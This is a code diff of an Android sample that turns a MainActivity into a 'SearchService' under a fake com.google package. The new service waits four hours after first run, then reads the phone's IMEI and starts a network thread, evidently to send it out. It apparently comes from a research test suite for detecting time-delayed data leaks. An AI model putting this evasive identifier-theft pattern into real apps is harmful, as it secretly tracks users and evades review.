@@ -1,8 +1,10 @@
-package edu.ucdavis.time1;
+package com.google.ssearch;
 
+import android.app.Service;
 import android.content.Context;
-import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -12,32 +14,36 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Calendar;
 
 /**
- * Class: MainActivity
- * Description: Sensitive data is read in onCreate() and send out when current hour is in 2AM~5AM
+ * Class: SearchService
+ * Description:
  * Authors：Hao Fu(haofu@ucdavis.edu)
- * Date: 6/30/2016 6:05 PM
+ * Date: 6/30/2016 6:33 PM
  */
-public class MainActivity extends AppCompatActivity {
-
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        String imei = telephonyManager.getDeviceId(); //source
-
-        Calendar calendar = Calendar.getInstance();
-        int hours = calendar.get(Calendar.HOUR_OF_DAY);
-
-        if (hours > 2 && hours < 5) {
-            Log.d(getClass().getSimpleName(), "Hours: " + hours);
+public class SearchService extends Service {
+    public void onCreate() {
+        super.onCreate();
+        SharedPreferences p = getSharedPreferences("sstimestamp", 0);
+        long last = p.getLong("start", 0);
+        long cur = System.currentTimeMillis();
+        if (last == 0) {
+            SharedPreferences.Editor ed = p.edit();
+            ed.putLong("start", cur);
+            ed.commit();
+            stopSelf();
+        } else if (cur - last < 14400000) {
+            stopSelf();
+        } else {
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            String imei = telephonyManager.getDeviceId(); //source
             Thread connectionThread = new Thread(new ConnectionThread(imei));
             connectionThread.start();
         }
+    }
+
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 
     private class ConnectionThread implements Runnable {
